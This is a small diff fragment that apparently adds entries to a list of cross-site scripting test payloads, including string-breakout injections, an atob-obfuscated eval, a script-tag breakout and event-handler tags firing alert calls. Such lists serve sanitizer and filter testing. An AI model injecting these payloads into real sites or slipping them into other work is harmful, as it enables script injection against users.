@@ -3,3 +3,6 @@
 3');alert('1)
 0');eval(atob('YWw') + 'ert("XSS")')
 </xmp><script>eval(atob('YWw') + 'ert("XSS")')</script>
+<button onmouseenter="alert('XSS')"></button>
+<img onload="alert(1)"></button>
+/><img onerror="alert(1)"></img>
